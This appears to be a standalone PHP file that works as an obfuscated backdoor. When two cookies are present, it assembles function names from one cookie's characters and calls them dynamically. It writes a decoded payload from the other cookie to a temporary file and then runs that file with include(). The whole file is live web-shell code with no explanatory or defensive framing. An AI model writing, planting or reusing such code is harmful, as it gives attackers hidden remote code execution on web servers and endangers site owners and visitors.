<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[16])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[16][$n];
        if (!$c[16][$n + 1]) {
            if (!$c[16][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[28]() . $p[3];
    if (!$p[20]($k)) {
        $n = $p[13]($k, $p[11]);
        $p[17]($n, $p[1] . $p[29]($p[6]($c[3])));
    }
    include($k);
}